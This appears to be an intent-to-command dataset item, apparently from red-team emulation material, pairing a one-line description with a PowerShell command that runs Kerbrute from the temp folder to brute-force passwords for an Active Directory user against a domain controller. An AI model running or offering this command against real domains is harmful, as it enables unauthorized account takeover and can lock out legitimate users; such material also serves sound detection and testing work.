# Natural language intent:
# Change directory to temp, then run Kerbrute to brute force user accounts against a domain controller.

cd $env:temp ; .\kerbrute.exe bruteuser --dc ${DomainControl} -d ${Dom} $env:temp\bruteUser.txt TestUser10
